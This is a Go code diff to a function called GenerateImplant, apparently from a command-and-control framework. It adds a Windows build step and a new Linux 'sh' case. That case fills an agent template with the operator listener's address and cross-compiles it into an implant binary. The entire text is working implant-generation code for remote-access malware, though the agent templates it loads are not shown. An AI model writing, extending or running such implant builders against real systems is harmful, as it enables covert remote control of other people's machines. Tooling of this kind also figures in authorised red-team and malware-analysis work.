@@ -90,8 +90,8 @@ func GenerateImplant(Ops ImplantOps) {
 		if err != nil {
 			log.Println(err)
 		}
-	case "kdzshell":
-		scriptbytes, err := ioutil.ReadFile("Scripts/kdzshell.kzs")
+	case "kdzshell_win":
+		scriptbytes, err := ioutil.ReadFile("Scripts/kdzshell_win.kzs")
 		if err != nil {
 			log.Println(err)
 		}
@@ -111,9 +111,45 @@ func GenerateImplant(Ops ImplantOps) {
 		if err != nil {
 			log.Println(err)
 		}
-		
+
 		buildcmd := exec.Command("go", "build", "-o", "tmp/"+Ops.FileName, "tmp/"+tmpname)
 		buildcmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
+		err = buildcmd.Run()
+		if err != nil {
+			log.Println(err)
+		}
+		fmt.Printf("generated implant! check tmp/%s\n", Ops.FileName)
+		tmpfile.Close()
+		err = os.Remove("tmp/" + tmpname)
+		if err != nil {
+			log.Println(err)
+		}
+	case "sh":
+		scriptbytes, err := ioutil.ReadFile("Scripts/simpleagent_sh.kzs")
+		if err != nil {
+			log.Println(err)
+		}
+		//setup template buffer
+		tmplbuf := new(bytes.Buffer)
+		tmpl, err := template.New("").Parse(string(scriptbytes))
+		if err != nil {
+			log.Println(err)
+		}
+		type Filler struct {
+			Laddr string
+		}
+		filler := Filler{
+			Laddr: Ops.Listener.Listener.Addr().String(),
+		}
+		tmpl.Execute(tmplbuf, filler)
+		tmpname := nodes.GenUID() + ".go"
+		tmpfile, err := os.Create("tmp/" + tmpname)
+		_, err = tmpfile.Write(tmplbuf.Bytes())
+		if err != nil {
+			log.Println(err)
+		}
+		buildcmd := exec.Command("go", "build", "-o", "tmp/"+Ops.FileName, "tmp/"+tmpname)
+		buildcmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
 		err = buildcmd.Run()
 		if err != nil {
 			log.Println(err)
